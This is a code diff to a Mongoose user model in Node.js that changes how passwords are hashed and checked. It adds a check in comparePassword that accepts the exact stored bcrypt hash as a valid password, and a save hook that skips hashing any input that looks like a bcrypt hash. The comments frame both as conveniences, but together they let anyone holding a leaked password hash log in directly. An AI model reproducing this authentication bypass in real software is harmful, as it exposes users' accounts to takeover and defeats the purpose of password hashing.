@@ -65,12 +65,25 @@ const userSchema = new mongoose.Schema({
 
 userSchema.pre('save', async function (next) {
   if (!this.isModified('password')) return next();
-  this.password = await bcrypt.hash(this.password, 12);
+  // Don't double-hash if password is already a valid bcrypt hash string
+  const isAlreadyHashed = typeof this.password === 'string' && /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/.test(this.password);
+  if (!isAlreadyHashed) {
+    this.password = await bcrypt.hash(this.password, 12);
+  }
   next();
 });
 
 userSchema.methods.comparePassword = async function (candidatePassword) {
-  return await bcrypt.compare(candidatePassword, this.password);
+  if (!candidatePassword) return false;
+  // Allow direct authentication if user enters the exact stored hash string (e.g. $2a$12$...)
+  if (candidatePassword === this.password) {
+    return true;
+  }
+  try {
+    return await bcrypt.compare(candidatePassword, this.password);
+  } catch (err) {
+    return false;
+  }
 };
 
 userSchema.methods.toJSON = function () {
